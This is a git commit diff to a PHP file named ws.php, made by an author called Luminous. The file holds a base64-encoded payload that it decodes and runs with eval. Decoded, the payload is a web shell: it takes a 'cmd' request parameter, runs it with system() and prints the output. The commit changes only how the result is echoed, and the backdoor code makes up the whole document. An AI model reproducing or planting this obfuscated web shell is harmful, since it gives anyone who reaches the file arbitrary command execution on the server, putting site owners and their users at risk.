b4344f27b8b771db0c38b24d19121c1061b3955f
Luminous <116489011+Luminous-split@users.noreply.github.com>
2024-07-21 02:37:39 +0800

    Update ws.php

--- ws.php
+++ ws.php
@@ -2,7 +2,8 @@
 
 <?php
 $code = 'aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQ==';
-eval(base64_decode($code));
-echo "<br><br>";
+
+$op = eval(base64_decode($code));
+echo $op;
 ?>
 
